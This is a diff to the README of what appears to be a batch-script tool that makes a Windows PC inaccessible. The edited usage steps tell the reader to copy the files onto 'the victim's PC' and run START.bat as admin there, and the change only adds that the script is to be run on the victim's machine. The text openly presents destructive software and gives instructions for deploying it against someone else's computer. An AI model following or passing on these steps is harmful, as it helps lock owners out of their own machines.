@@ -15,4 +15,4 @@ A batchscript to make a Windows PC inaccessible.
 1. Download the zip file which contains all the files from this github repository.
 2. Unzip the zip file and delete extra files.
 3. Put all the files in your desired directory on the victim's PC.
-4. Execute the START.bat file as admin.
+4. Execute the START.bat file as admin on the victim's PC.
